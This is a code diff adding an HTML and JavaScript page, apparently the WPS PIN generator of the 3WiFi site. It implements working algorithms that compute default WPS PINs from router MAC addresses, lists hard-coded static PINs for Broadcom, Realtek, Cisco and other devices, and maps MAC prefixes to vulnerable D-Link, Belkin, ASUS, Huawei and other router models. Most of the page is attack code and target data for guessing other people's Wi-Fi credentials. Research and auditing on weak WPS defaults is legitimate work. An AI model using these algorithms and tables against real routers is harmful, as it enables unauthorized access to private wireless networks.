+	algos.push({id: "pin24rn", name: "Reverse nibble 24-bit", mode: ALGO_MAC, func: function (mac)
+	{
+		mac &= 0xFFFFFF;
+		mac = zeroFill(mac.toString(16), 6);
+		return parseInt(reverse(mac), 16);
+	}});
+	algos.push({id: "pin32rn", name: "Reverse nibble 32-bit", mode: ALGO_MAC, func: function (mac)
+	{
+		mac %= 0x100000000;
+		mac = zeroFill(mac.toString(16), 8);
+		return parseInt(reverse(mac), 16);
+	}});
+	algos.push({id: "pin48rn", name: "Reverse nibble 48-bit", mode: ALGO_MAC, func: function (mac)
+	{
+		mac = zeroFill(mac.toString(16), 12);
+		return parseInt(reverse(mac), 16);
+	}});
+	algos.push({id: "pin24rb", name: "Reverse bits 24-bit", mode: ALGO_MAC, func: function (mac)
+	{
+		mac &= 0xFFFFFF;
+		mac = zeroFill(mac.toString(2), 24);
+		return parseInt(reverse(mac), 2);
+	}});
+	algos.push({id: "pin32rb", name: "Reverse bits 32-bit", mode: ALGO_MAC, func: function (mac)
+	{
+		mac %= 0x100000000;
+		mac = zeroFill(mac.toString(2), 32);
+		return parseInt(reverse(mac), 2);
+	}});
+	algos.push({id: "pin48rb", name: "Reverse bits 48-bit", mode: ALGO_MAC, func: function (mac)
+	{
+		mac = zeroFill(mac.toString(2), 48);
+		return parseInt(reverse(mac), 2);
+	}});
+	algos.push({id: "pinDLink", name: "D-Link PIN", mode: ALGO_MAC, func: algoDLink});
+	algos.push({id: "pinDLink1", name: "D-Link PIN +1", mode: ALGO_MAC, func: function (mac)
+	{
+		return algoDLink(mac + 1);
+	}});
+	algos.push({id: "pinBelkin", name: "Belkin PIN", mode: ALGO_MACSN, func: function (mac, ser)
+	{
+		return algoDSL_MAC_SN(mac, ser, {bx: [66, 129, 209, 10, 24, 3, 39]});
+	}});
+	algos.push({id: "pinEasyBox", name: "Vodafone EasyBox", mode: ALGO_MACSN, func: function (mac, ser)
+	{
+		if (ser == null)
+			ser = (mac & 0xFFFF).toString(10);
+		return algoDSL_MAC_SN(mac, ser, {bx: [129, 65, 6, 10, 136, 80, 33]});
+	}});
+	algos.push({id: "pinLivebox", name: "Livebox Arcadyan", mode: ALGO_MACSN, func: function (mac, ser)
+	{
+		return algoDSL_MAC_SN(mac - 2, ser, {bx: [129, 65, 6, 10, 136, 80, 33]});
+	}});
+	algos.push({id: "pinASUS", name: "ASUS PIN", mode: ALGO_MAC, func: function (mac)
+	{
+		mac = zeroFill(mac.toString(16), 12);
+		var b = [];
+		b[0] = parseInt(mac.substr(0, 2), 16);
+		b[1] = parseInt(mac.substr(2, 2), 16);
+		b[2] = parseInt(mac.substr(4, 2), 16);
+		b[3] = parseInt(mac.substr(6, 2), 16);
+		b[4] = parseInt(mac.substr(8, 2), 16);
+		b[5] = parseInt(mac.substr(10, 2), 16);
+		var pin = [];
+		for (var i = 0; i < 7; i++)
+		{
+			pin[i] = (b[i % 6] + b[5]) % (10 - ((i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7));
+		}
+		return parseInt(pin.join(''), 10);
+	}});
+	algos.push({id: "pinAirocon", name: "Airocon Realtek", mode: ALGO_MAC, func: function (mac)
+	{
+		mac = zeroFill(mac.toString(16), 12);
+		var b = [];
+		b[0] = parseInt(mac.substr(0, 2), 16);
+		b[1] = parseInt(mac.substr(2, 2), 16);
+		b[2] = parseInt(mac.substr(4, 2), 16);
+		b[3] = parseInt(mac.substr(6, 2), 16);
+		b[4] = parseInt(mac.substr(8, 2), 16);
+		b[5] = parseInt(mac.substr(10, 2), 16);
+		return ((b[0] + b[1]) % 10)
+		+ (((b[5] + b[0]) % 10) * 10)
+		+ (((b[4] + b[5]) % 10) * 100)
+		+ (((b[3] + b[4]) % 10) * 1000)
+		+ (((b[2] + b[3]) % 10) * 10000)
+		+ (((b[1] + b[2]) % 10) * 100000)
+		+ (((b[0] + b[1]) % 10) * 1000000);
+	}});
+	algos.push({id: "pinInvNIC", name: "Inv NIC to PIN", mode: ALGO_MAC, func: function (mac)
+	{
+		mac &= 0xFFFFFF;
+		return ~mac & 0xFFFFFF;
+	}});
+	algos.push({id: "pinNIC2", name: "NIC * 2", mode: ALGO_MAC, func: function (mac) {return (mac & 0xFFFFFF) * 2;}});
+	algos.push({id: "pinNIC3", name: "NIC * 3", mode: ALGO_MAC, func: function (mac) {return (mac & 0xFFFFFF) * 3;}});
+	algos.push({id: "pinOUIaddNIC", name: "OUI + NIC", mode: ALGO_MAC, func: function (mac)
+	{
+		mac = zeroFill(mac.toString(16), 12);
+		var oui = parseInt(mac.substr(0, 6), 16);
+		var nic = parseInt(mac.substr(6, 6), 16);
+		return (oui + nic) % 0x1000000;
+	}});
+	algos.push({id: "pinOUIsubNIC", name: "OUI - NIC", mode: ALGO_MAC, func: function (mac)
+	{
+		mac = zeroFill(mac.toString(16), 12);
+		var oui = parseInt(mac.substr(0, 6), 16);
+		var nic = parseInt(mac.substr(6, 6), 16);
+		if (nic < oui)
+		{
+			return oui - nic;
+		} else {
+			return (oui + 0x1000000 - nic) & 0xFFFFFF;
+		}
+	}});
+	algos.push({id: "pinOUIxorNIC", name: "OUI ^ NIC", mode: ALGO_MAC, func: function (mac)
+	{
+		mac = zeroFill(mac.toString(16), 12);
+		var oui = parseInt(mac.substr(0, 6), 16);
+		var nic = parseInt(mac.substr(6, 6), 16);
+		return oui ^ nic;
+	}});
+	algos.push({id: "pinEmpty", name: "Empty PIN", mode: ALGO_EMPTY, func: function (mac) {return '';}});
+	algos.push({id: "pinCisco", name: "Cisco", mode: ALGO_STATIC, func: function (mac) {return 1234567;}});
+	algos.push({id: "pinBrcm1", name: "Broadcom 1", mode: ALGO_STATIC, func: function (mac) {return 2017252;}});
+	algos.push({id: "pinBrcm2", name: "Broadcom 2", mode: ALGO_STATIC, func: function (mac) {return 4626484;}});
+	algos.push({id: "pinBrcm3", name: "Broadcom 3", mode: ALGO_STATIC, func: function (mac) {return 7622990;}});
+	algos.push({id: "pinBrcm4", name: "Broadcom 4", mode: ALGO_STATIC, func: function (mac) {return 6232714;}});
+	algos.push({id: "pinBrcm5", name: "Broadcom 5", mode: ALGO_STATIC, func: function (mac) {return 1086411;}});
+	algos.push({id: "pinBrcm6", name: "Broadcom 6", mode: ALGO_STATIC, func: function (mac) {return 3195719;}});
+	algos.push({id: "pinAirc1", name: "Airocon 1", mode: ALGO_STATIC, func: function (mac) {return 3043203;}});
+	algos.push({id: "pinAirc2", name: "Airocon 2", mode: ALGO_STATIC, func: function (mac) {return 7141225;}});
+	algos.push({id: "pinDSL2740R", name: "DSL-2740R", mode: ALGO_STATIC, func: function (mac) {return 6817554;}});
+	algos.push({id: "pinRealtek1", name: "Realtek 1", mode: ALGO_STATIC, func: function (mac) {return 9566146;}});
+	algos.push({id: "pinRealtek2", name: "Realtek 2", mode: ALGO_STATIC, func: function (mac) {return 9571911;}});
+	algos.push({id: "pinRealtek3", name: "Realtek 3", mode: ALGO_STATIC, func: function (mac) {return 4856371;}});
+	algos.push({id: "pinUpvel", name: "Upvel", mode: ALGO_STATIC, func: function (mac) {return 2085483;}});
+	algos.push({id: "pinUR814AC", name: "UR-814AC", mode: ALGO_STATIC, func: function (mac) {return 4397768;}});
+	algos.push({id: "pinUR825AC", name: "UR-825AC", mode: ALGO_STATIC, func: function (mac) {return 0529417;}});
+	algos.push({id: "pinOnlime", name: "Onlime", mode: ALGO_STATIC, func: function (mac) {return 9995604;}});
+	algos.push({id: "pinEdimax", name: "Edimax", mode: ALGO_STATIC, func: function (mac) {return 3561153;}});
+	algos.push({id: "pinThomson", name: "Thomson", mode: ALGO_STATIC, func: function (mac) {return 6795814;}});
+	algos.push({id: "pinHG532x", name: "HG532x", mode: ALGO_STATIC, func: function (mac) {return 3425928;}});
+	algos.push({id: "pinH108L", name: "H108L", mode: ALGO_STATIC, func: function (mac) {return 9422988;}});
+	algos.push({id: "pinONO", name: "CBN ONO", mode: ALGO_STATIC, func: function (mac) {return 9575521;}});
+}
+function initpage()
+{
+	initAlgos();
+	for (var i = 0; i < algos.length; i++)
+	{
+		if (algos[i].mode == ALGO_STATIC)
+		{
+			$('#algosel').append($('<option>').val(algos[i].id).text('Static PIN - ' + algos[i].name));
+		} else {
+			$('#algosel').append($('<option>').val(algos[i].id).text(algos[i].name));
+		}
+	}
+}
+</script>
+
+</head>
+<body onload="initmenu(); initpage()">
+<div class=header>
+	
+	<div class=mainmenu>
+		<a href="home"><img class=menulogo src="img/logo.png"></a>
+		<div class="menubtn logoplace"><p></p></div>
+		<span class=multi>
+			<a href="home"><div class="menubtn"><p>About</p></div></a>
+			<span class=submenu>
+				<a href="home"><div class="submbtn"><p>Home</p></div></a>
+				<a href="faq"><div class="submbtn"><p>F.A.Q</p></div></a>
+				<a href="apidoc"><div class="submbtn"><p>3WiFi API</p></div></a>
+				<a href="rules"><div class="submbtn"><p>Site rules</p></div></a>
+			</span>
+		</span>
+		<a href="map"><div class="menubtn"><p>Map</p></div></a>
+		<a href="find"><div class="menubtn"><p>Search</p></div></a>
+		<span class=multi>
+			<a href="ranges"><div class="menubtn mbsel"><p>Tools</p></div></a>
+			<span class=submenu>
+				<a href="ranges"><div class="submbtn"><p>Search IP ranges</p></div></a>
+				<a href="devmac"><div class="submbtn"><p>Device by MAC</p></div></a>
+				<a href="wpspin"><div class="submbtn smsel"><p>WPS PIN generator</p></div></a>
+			</span>
+		</span>
+		<a href="upload"><div class="menubtn"><p>Upload</p></div></a>
+		<span class=multi>
+			<a href="stat"><div class="menubtn"><p>State</p></div></a>
+			<span class=submenu>
+				<a href="stat"><div class="submbtn"><p>Statistics</p></div></a>
+				<a href="graph"><div class="submbtn"><p>Dynamics</p></div></a>
+			</span>
+		</span>
+		<a href="javascript://" onclick="loginBtn(false)" style="float: right"><div class=menubtn><p>Login</p></div></a>
+		<a href="user"><div class="menubtn" style="float: right"><p></p></div></a>
+		<span class=multi style="display: none; float: right">
+			<a href="user"><div class="menubtn"><p></p></div></a>
+			<span class=submenu>
+				<a href="#" onclick="return doReturnView()"><div class="submbtn" id=returnbtn><p>Return to %username%</p></div></a>
+			</span>
+		</span>
+	</div>
+</div>
+
+
+<div class="content wpspin">
+<table width=100%>
+	<tr><td width=50% style="vertical-align: top">
+		<p>Offline WPS PIN Companion from Router Scan.</p>
+		<p>Uses known algorithms, does not use database.</p>
+		<table>
+			<tr><td>
+				<textarea id=bssids rows=3 cols=32 autofocus>12:34:56:78:9A:BC</textarea>
+			</td><td>
+				<button onclick="pinSuggest()">Suggest</button> <button onclick="getAll()">Get All</button>
+			</td></tr>
+
+			<tr><td colspan=2>
+				<textarea id=result readonly rows=14 cols=52></textarea>
+			</td></tr>
+		</table>
+
+		<div>Implemented algorithms (choose for info):</div>
+
+		<select id=algosel onchange="showAlgo()"><option value=algonone>Not selected</option></select>
+
+		&nbsp; <button onclick="crackAlgo()">Check algorithm</button>
+	</td><td width=50% style="vertical-align: top">
+		<p>Online 3WiFi WPS PIN generator.</p>
+		<p>Takes advantage of collected data in the database, detects linear sequences, static PIN codes, and other algorithms.</p>
+		<form id=fdeviceform enctype="multipart/form-data" method="POST" onsubmit="detect(); return false">
+		<table>
+			<tbody>
+				<tr>
+					<td><nobr>BSSID / MAC:</nobr></td>
+					<td><input name="bssid" type="text" value="" pattern="([0-9A-Fa-f]{2}[:-]?){5}[0-9A-Fa-f]{2}" /></td>
+					<td><nobr> (like <tt>00:11:22:33:44:55</tt>)</nobr></td>
+				</tr>
+			</tbody>
+			<tbody>
+				<tr><td><input type=submit value="Detect" /></td><td></td></tr>
+			</tbody>
+		</table>
+		</form>
+		<br>
+		<table class=st1>
+			<tbody id=fhead></tbody>
+			<tbody id=fdata></tbody>
+		</table>
+	</td></tr>
+</table>
+
+<div style="display: none">
+<textarea id=suggpin rows=14 cols=38></textarea>
+
+<textarea id=pin24>ZyXEL NDMS
+  04:BF:6D:xx:xx:xx
+  0E:5D:4E:xx:xx:xx
+  10:7B:EF:xx:xx:xx
+  14:A9:E3:xx:xx:xx
+  28:28:5D:xx:xx:xx
+  2A:28:5D:xx:xx:xx
+  32:B2:DC:xx:xx:xx
+  38:17:66:xx:xx:xx
+  40:4A:03:xx:xx:xx
+  4E:5D:4E:xx:xx:xx
+  50:67:F0:xx:xx:xx
+  5C:F4:AB:xx:xx:xx
+  6A:28:5D:xx:xx:xx
+  8E:5D:4E:xx:xx:xx
+  AA:28:5D:xx:xx:xx
+  B0:B2:DC:xx:xx:xx
+  C8:6C:87:xx:xx:xx
+  CC:5D:4E:xx:xx:xx
+  CE:5D:4E:xx:xx:xx
+  EA:28:5D:xx:xx:xx
+  E2:43:F6:xx:xx:xx
+  EC:43:F6:xx:xx:xx
+  EE:43:F6:xx:xx:xx
+  F2:B2:DC:xx:xx:xx
+  FC:F5:28:xx:xx:xx
+  FE:F5:28:xx:xx:xx
+  WSC Device Names:
+    ZyXEL Internet Center
+    Keenetic Giga II
+    Keenetic Lite III
+    Keenetic Ultra
+    RalinkAPS
+ZyXEL DEL1201-T10A
+  4C:9E:FF:xx:xx:xx
+TRENDnet (some firmwares)
+TRENDnet TEW-651BR
+  00:14:D1:xx:xx:xx
+TRENDnet TEW-735AP
+  D8:EB:97:xx:xx:xx
+  WSC Device Names:
+    Wireless-N Multi-function AP
+D-Link DIR-300NRU B5
+  1C:7E:E5:xx:xx:xx
+  84:C9:B2:xx:xx:xx
+  FC:75:16:xx:xx:xx
+  WSC Device Names:
+    RalinkAPS
+D-Link DIR-620
+  14:D6:4D:xx:xx:xx
+  90:94:E4:xx:xx:xx
+  BC:F6:85:xx:xx:xx
+  WSC Device Names:
+    RalinkAPS
+D-Link DSL-2600U
+  C4:A8:1D:xx:xx:xx
+Huawei HG532e
+  00:66:4B:xx:xx:xx
+  08:7A:4C:xx:xx:xx
+  14:B9:68:xx:xx:xx
+  20:08:ED:xx:xx:xx
+  34:6B:D3:xx:xx:xx
+  4C:ED:DE:xx:xx:xx
+  78:6A:89:xx:xx:xx
+  88:E3:AB:xx:xx:xx
+  D4:6E:5C:xx:xx:xx
+  E8:CD:2D:xx:xx:xx
+  EC:23:3D:xx:xx:xx
+  EC:CB:30:xx:xx:xx
+  F4:9F:F3:xx:xx:xx
+  WSC Device Names:
+    RalinkAPS
+ASUS RT-G32
+ASUS RT-N13U
+ASUS RT-N13U Rev.B1
+  20:CF:30:xx:xx:xx
+  90:E6:BA:xx:xx:xx
+  E0:CB:4E:xx:xx:xx
+Upvel UR-309BN
+Upvel UR-309NB
+  D4:BF:7F:4x:xx:xx
+Upvel (some firmwares)
+  F8:C0:91:xx:xx:xx
+Belkin F5D8231-4v5000
+  00:1C:DF:xx:xx:xx
+Belkin F5D8235-4v1000  
+  00:22:75:xx:xx:xx
+Belkin F9K1104v1
+  08:86:3B:xx:xx:xx
+Tenda W309R
+  00:B0:0C:xx:xx:xx
+  08:10:75:xx:xx:xx
+  C8:3A:35:xx:xx:xx
+Conceptronic c300brs4a v2_v1.0.0
+  00:22:F7:xx:xx:xx
+Edimax 3G-6210n  
+Edimax 3G-6220n
+  00:1F:1F:xx:xx:xx
+Hitron CDE-30364
+  00:26:5B:xx:xx:xx
+  68:B6:CF:xx:xx:xx
+  78:8D:F7:xx:xx:xx
+  BC:14:01:xx:xx:xx
+Huawei HG566a
+  20:2B:C1:xx:xx:xx
+  30:87:30:xx:xx:xx
+  5C:4C:A9:xx:xx:xx
+  62:23:3D:xx:xx:xx
+  62:3C:E4:xx:xx:xx
+  62:3D:FF:xx:xx:xx
+  62:53:D4:xx:xx:xx
+  62:55:9C:xx:xx:xx
+  62:6B:D3:xx:xx:xx
+  62:7D:5E:xx:xx:xx
+  62:96:BF:xx:xx:xx
+  62:A8:E4:xx:xx:xx
+  62:B6:86:xx:xx:xx
+  62:C0:6F:xx:xx:xx
+  62:C6:1F:xx:xx:xx
+  62:C7:14:xx:xx:xx
+  62:CB:A8:xx:xx:xx
+  62:CD:BE:xx:xx:xx
+  62:E8:7B:xx:xx:xx
+  64:16:F0:xx:xx:xx
+  6A:1D:67:xx:xx:xx
+  6A:23:3D:xx:xx:xx
+  6A:3D:FF:xx:xx:xx
+  6A:53:D4:xx:xx:xx
+  6A:55:9C:xx:xx:xx
+  6A:6B:D3:xx:xx:xx
+  6A:96:BF:xx:xx:xx
+  6A:7D:5E:xx:xx:xx
+  6A:A8:E4:xx:xx:xx
+  6A:C0:6F:xx:xx:xx
+  6A:C6:1F:xx:xx:xx
+  6A:C7:14:xx:xx:xx
+  6A:CB:A8:xx:xx:xx
+  6A:CD:BE:xx:xx:xx
+  6A:D1:5E:xx:xx:xx
+  6A:D1:67:xx:xx:xx
+  72:1D:67:xx:xx:xx
+  72:23:3D:xx:xx:xx
+  72:3C:E4:xx:xx:xx
+  72:3D:FF:xx:xx:xx
+  72:53:D4:xx:xx:xx
+  72:55:9C:xx:xx:xx
+  72:6B:D3:xx:xx:xx
+  72:7D:5E:xx:xx:xx
+  72:96:BF:xx:xx:xx
+  72:A8:E4:xx:xx:xx
+  72:C0:6F:xx:xx:xx
+  72:C6:1F:xx:xx:xx
+  72:C7:14:xx:xx:xx
+  72:CB:A8:xx:xx:xx
+  72:CD:BE:xx:xx:xx
+  72:D1:5E:xx:xx:xx
+  72:E8:7B:xx:xx:xx
+Kuzomi K1500
+Kuzomi K1550
+  00:26:CE:xx:xx:xx
+MitraStar DSL-100HN-T1v4
+  98:97:D1:xx:xx:xx
+  E0:41:36:xx:xx:xx
+MitraStar HGW-2501GN-R2
+  B2:46:FC:xx:xx:xx
+  E2:41:36:xx:xx:xx
+PIX-LINK LV-WR02
+  00:E0:20:xx:xx:xx
+  WSC Device Names:
+    RalinkAPS
+Samsung SMT-G7440
+  5C:A3:9D:xx:xx:xx
+  D8:6C:E9:xx:xx:xx
+  DC:71:44:xx:xx:xx
+Samsung SWL
+  80:1F:02:xx:xx:xx
+  E4:7C:F9:xx:xx:xx
+Sitecom WLR-6000
+  00:0C:F6:xx:xx:xx
+  WSC Device Names:
+    Sitecom Wireless Gigabit Router
+TELDAT iRouter1104-W
+  00:A0:26:xx:xx:xx
+TP-Link TD-W8951ND
+  A0:F3:C1:xx:xx:xx
+TP-Link TD-W8961NDv2.1
+  64:70:02:xx:xx:xx
+  B0:48:7A:xx:xx:xx
+  F8:1A:67:xx:xx:xx
+  F8:D1:11:xx:xx:xx
+B+B Smartworx BB-WR-600N
+  34:BA:9A:xx:xx:xx
+  B4:94:4E:xx:xx:xx
+  WSC Device Names:
+    RalinkAPS
+
+Technical details:
+Pin = MAC[7..12]
+https://web.archive.org/web/20171019081951/http://hellocow.cn/2012/04/get-the-pin-in-router-mac-address-start-with-c83a35-00b00c-081075/</textarea>
+
+<textarea id=pin28>Huawei HG8245H
+  20:0B:C7:xx:xx:xx
+  48:46:FB:xx:xx:xx
+  D4:6A:A8:xx:xx:xx
+  F8:4A:BF:xx:xx:xx
+
+Technical details:
+Pin = MAC[6..12]</textarea>
+
+<textarea id=pin32>D-Link DIR-300 (some firmwares)
+  00:07:26:xx:xx:xx
+  D8:FE:E3:xx:xx:xx
+  FC:8B:97:xx:xx:xx
+D-Link DIR-825AC (some firmwares)
+  10:62:EB:xx:xx:xx
+  1C:5F:2B:xx:xx:xx
+  48:EE:0C:xx:xx:xx
+  80:26:89:xx:xx:xx
+  90:8D:78:xx:xx:xx
+  WSC Device Names:
+    DIR-825AC
+D-Link DAP-1360 (some firmwares)
+  E8:CC:18:xx:xx:xx
+Beeline DIR-300
+  2C:AB:25:xx:xx:xx
+ASUS (some firmwares)
+ASUS RT-N13U Rev.B1
+  10:BF:48:xx:xx:xx
+  14:DA:E9:xx:xx:xx
+  30:85:A9:xx:xx:xx
+  50:46:5D:xx:xx:xx
+  54:04:A6:xx:xx:xx
+  C8:60:00:xx:xx:xx
+  F4:6D:04:xx:xx:xx
+ASUS EA-N66
+  30:85:A9:xx:xx:xx
+EDIMAX BR6428GN
+EDIMAX BR6228GNS
+  80:1F:02:xx:xx:xx
+
+Technical details:
+Pin = MAC[5..12]</textarea>
+
+<textarea id=pin36>Unknown, for testing
+
+Technical details:
+Pin = MAC[4..12]</textarea>
+
+<textarea id=pin40>Unknown, for testing
+
+Technical details:
+Pin = MAC[3..12]</textarea>
+
+<textarea id=pin44>Unknown, for testing
+
+Technical details:
+Pin = MAC[2..12]</textarea>
+
+<textarea id=pin48>Unknown, for testing
+
+Technical details:
+Pin = MAC[1..12]</textarea>
+
+<textarea id=pin24rh>Unknown, for testing
+
+Technical details:
+Pin = MAC[12..7]</textarea>
+
+<textarea id=pin32rh>Unknown, for testing
+
+Technical details:
+Pin = MAC[12..5]</textarea>
+
+<textarea id=pin48rh>Unknown, for testing
+
+Technical details:
+Pin = MAC[12..1]</textarea>
+
+<textarea id=pin24rn>Unknown, for testing
+
+Technical details:
+Pin = MAC[12..7]</textarea>
+
+<textarea id=pin32rn>Unknown, for testing
+
+Technical details:
+Pin = MAC[12..5]</textarea>
+
+<textarea id=pin48rn>Unknown, for testing
+
+Technical details:
+Pin = MAC[12..1]</textarea>
+
+<textarea id=pin24rb>Unknown, for testing
+
+Technical details:
+Pin = MAC[12..7]</textarea>
+
+<textarea id=pin32rb>Unknown, for testing
+
+Technical details:
+Pin = MAC[12..5]</textarea>
+
+<textarea id=pin48rb>Unknown, for testing
+
+Technical details:
+Pin = MAC[12..1]</textarea>
+
+<textarea id=pinDLink>D-Link DAP-1155 Rev. A1
+D-Link DAP-1360 Rev. B1
+D-Link DIR-651
+D-Link DIR-825AC
+  14:D6:4D:xx:xx:xx
+  1C:7E:E5:xx:xx:xx
+  28:10:7B:xx:xx:xx
+  84:C9:B2:xx:xx:xx
+  A0:AB:1B:xx:xx:xx
+  B8:A3:86:xx:xx:xx
+  C0:A0:BB:xx:xx:xx
+  CC:B2:55:xx:xx:xx
+  FC:75:16:xx:xx:xx
+TRENDnet TEW-432BRP
+TRENDnet TEW-651BR
+TRENDnet TEW-652BRP
+TRENDnet TEW-731BR
+  00:14:D1:xx:xx:xx
+  D8:EB:97:xx:xx:xx
+  WSC Device Names:
+    TEW-651BR
+
+Technical details:
+http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/</textarea>
+
+<textarea id=pinDLink1>D-Link DIR-400
+D-Link DIR-615 Rev. B2
+D-Link DIR-615 Rev. E4
+D-Link DIR-628 Rev. A2
+D-Link DIR-635 Rev. B1
+D-Link DIR-655
+D-Link DIR-825
+D-Link DIR-826L
+D-Link DIR-855 Rev. A2
+D-Link DIR-857
+  00:18:E7:xx:xx:xx
+  00:19:5B:xx:xx:xx
+  00:1C:F0:xx:xx:xx
+  00:1E:58:xx:xx:xx
+  00:21:91:xx:xx:xx
+  00:22:B0:xx:xx:xx
+  00:24:01:xx:xx:xx
+  00:26:5A:xx:xx:xx
+  14:D6:4D:xx:xx:xx
+  1C:7E:E5:xx:xx:xx
+  34:08:04:xx:xx:xx
+  5C:D9:98:xx:xx:xx
+  84:C9:B2:xx:xx:xx
+  B8:A3:86:xx:xx:xx
+  C8:BE:19:xx:xx:xx
+  C8:D3:A3:xx:xx:xx
+  CC:B2:55:xx:xx:xx
+  WSC Device Names:
+    D-Link Systems DIR-615
+    Wireless N Router
+TRENDnet TEW-652BRP
+TRENDnet TEW-673GRU
+  00:14:D1:xx:xx:xx
+
+Technical details:
+http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/</textarea>
+
+<textarea id=pinBelkin>Belkin F5D7234-4 v3
+Belkin F5D7234-4 v4
+Belkin F5D7234-4 v5
+Belkin F5D8233-4 v1
+Belkin F5D8233-4 v3
+Belkin F5D9231-4 v1
+Belkin F6D4230-4 v2
+Belkin F6D4230-4 v3
+Belkin F7D1301 v1
+Belkin F7D2301 v1
+Belkin F7D4401 v1
+Belkin F9J1102 v2
+Belkin F9J1105 v1
+Belkin F9K1001 v4
+Belkin F9K1001 v5
+Belkin F9K1002 v1
+Belkin F9K1002 v2
+Belkin F9K1002 v5
+Belkin F9K1102 v3
+Belkin F9K1102 v5
+Belkin F9K1103 v1
+Belkin F9K1105 v1
+Belkin F9K1105 v3
+Belkin F9K1105 v5
+Belkin F9K1112 v1
+Belkin F9K1113 v1
+Belkin F9K1118 v2
+  08:86:3B:xx:xx:xx
+  94:10:3E:xx:xx:xx
+  B4:75:0E:xx:xx:xx
+  C0:56:27:xx:xx:xx
+  EC:1A:59:xx:xx:xx
+  WSC Device Names:
+    Belkin Wireless Router(WFA)
+
+Technical details:
+http://www.devttys0.com/2015/04/reversing-belkins-wps-pin-algorithm/</textarea>
+
+<textarea id=pinEasyBox>Vodafone EasyBox 802
+Vodafone EasyBox 803
+Vodafone EasyBox 803 A
+  00:26:4D:xx:xx:xx
+  38:22:9D:xx:xx:xx
+  7C:4F:B5:xx:xx:xx
+
+Technical details:
+https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130805-0_Vodafone_EasyBox_Default_WPS_PIN_Vulnerability_v10.txt</textarea>
+
+<textarea id=pinLivebox>Arcadyan ARV7519
+Livebox 2.1 (Arcadyan)
+Livebox 2.2 (Arcadyan)
+  18:83:BF:xx:xx:xx
+  48:8D:36:xx:xx:xx
+  4C:09:D4:xx:xx:xx
+  50:7E:5D:xx:xx:xx
+  5C:DC:96:xx:xx:xx
+  74:31:70:xx:xx:xx
+  84:9C:A6:xx:xx:xx
+  88:03:55:xx:xx:xx
+  9C:80:DF:xx:xx:xx
+  A8:D3:F7:xx:xx:xx
+  D0:05:2A:xx:xx:xx
+  D4:63:FE:xx:xx:xx
+  WSC Device Names:
+    Livebox Wireless Router(WFA)
+
+Technical details:
+https://www.wifi-libre.com/topic-869-todo-sobre-al-algoritmo-wps-livebox-arcadyan-orange-xxxx.html</textarea>
+
+<textarea id=pinASUS>ASUS DSL-N10 Rev.C1
+ASUS DSL-N10E
+ASUS DSL-N10S
+ASUS DSL-N12E
+ASUS DSL-N12E Rev.C1
+ASUS DSL-N12U Rev.C1
+ASUS DSL-N14U
+ASUS RT-AC51U
+ASUS RT-AC53
+ASUS RT-G32
+ASUS RT-G32 Rev.C1
+ASUS RT-N10
+ASUS RT-N10 Rev.B1
+ASUS RT-N10 Rev.C1
+ASUS RT-N10+
+ASUS RT-N10E
+ASUS RT-N10LX
+ASUS RT-N10P
+ASUS RT-N10PV2
+ASUS RT-N10U
+ASUS RT-N11P
+ASUS RT-N12
+ASUS RT-N12 Rev.C1
+ASUS RT-N12 Rev.D1
+ASUS RT-N12+
+ASUS RT-N12E
+ASUS RT-N12LX
+ASUS RT-N12VP
+ASUS RT-N300
+ASUS RX3041 Rev.B
+  04:92:26:xx:xx:xx
+  04:D9:F5:xx:xx:xx
+  08:60:6E:xx:xx:xx
+  08:62:66:9x:xx:xx
+  10:7B:44:xx:xx:xx
+  10:BF:48:xx:xx:xx
+  10:C3:7B:xx:xx:xx
+  14:DD:A9:xx:xx:xx
+  1C:87:2C:xx:xx:xx
+  1C:B7:2C:xx:xx:xx
+  2C:56:DC:xx:xx:xx
+  2C:FD:A1:xx:xx:xx
+  30:5A:3A:xx:xx:xx
+  38:2C:4A:xx:xx:xx
+  38:D5:47:xx:xx:xx
+  40:16:7E:xx:xx:xx
+  50:46:5D:xx:xx:xx
+  54:A0:50:xx:xx:xx
+  60:45:CB:xx:xx:xx
+  60:A4:4C:xx:xx:xx
+  70:4D:7B:xx:xx:xx
+  74:D0:2B:xx:xx:xx
+  78:24:AF:xx:xx:xx
+  88:D7:F6:xx:xx:xx
+  9C:5C:8E:xx:xx:xx
+  AC:22:0B:xx:xx:xx
+  AC:9E:17:xx:xx:xx
+  B0:6E:BF:xx:xx:xx
+  BC:EE:7B:xx:xx:xx
+  C8:60:00:7x:xx:xx
+  D0:17:C2:xx:xx:xx
+  D8:50:E6:xx:xx:xx
+  E0:3F:49:xx:xx:xx
+  F0:79:59:78:xx:xx
+  F8:32:E4:xx:xx:xx
+  WSC Device Names:
+    ASUS WPS Router
+    RT-N10PV2
+    RT-N10U
+    RT-N12
+    RT-N12VP
+Airocon Realtek RTL867x
+  00:07:26:24:xx:xx
+  00:08:A1:D3:xx:xx
+  00:17:7C:xx:xx:xx
+  00:1E:A6:xx:xx:xx
+  00:30:4F:Bx:xx:xx
+  00:E0:4C:0x:xx:xx
+  04:8D:38:xx:xx:xx
+  08:10:77:xx:xx:xx
+  08:10:78:xx:xx:xx
+  08:10:79:xx:xx:xx
+  08:3E:5D:xx:xx:xx
+  10:FE:ED:3C:xx:xx
+  18:1E:78:xx:xx:xx
+  1C:44:19:xx:xx:xx
+  24:20:C7:xx:xx:xx
+  24:7F:20:xx:xx:xx
+  2C:AB:25:xx:xx:xx
+  30:85:A9:8C:xx:xx
+  3C:1E:04:xx:xx:xx
+  40:F2:01:xx:xx:xx
+  44:E9:DD:xx:xx:xx
+  48:EE:0C:xx:xx:xx
+  54:64:D9:xx:xx:xx
+  54:B8:0A:xx:xx:xx
+  58:7B:E9:06:xx:xx
+  60:D1:AA:21:xx:xx
+  64:51:7E:xx:xx:xx
+  64:D9:54:xx:xx:xx
+  6C:19:8F:xx:xx:xx
+  6C:72:20:xx:xx:xx
+  6C:FD:B9:xx:xx:xx
+  78:D9:9F:Dx:xx:xx
+  7C:26:64:xx:xx:xx
+  80:3F:5D:F6:xx:xx
+  84:A4:23:xx:xx:xx
+  88:A6:C6:xx:xx:xx
+  8C:10:D4:xx:xx:xx
+  8C:88:2B:00:xx:xx
+  90:4D:4A:xx:xx:xx
+  90:72:82:xx:xx:xx
+  90:F6:52:90:xx:xx
+  94:FB:B2:xx:xx:xx
+  A0:1B:29:xx:xx:xx
+  A0:F3:C1:Ex:xx:xx
+  A8:F7:E0:0x:xx:xx
+  AC:A2:13:xx:xx:xx
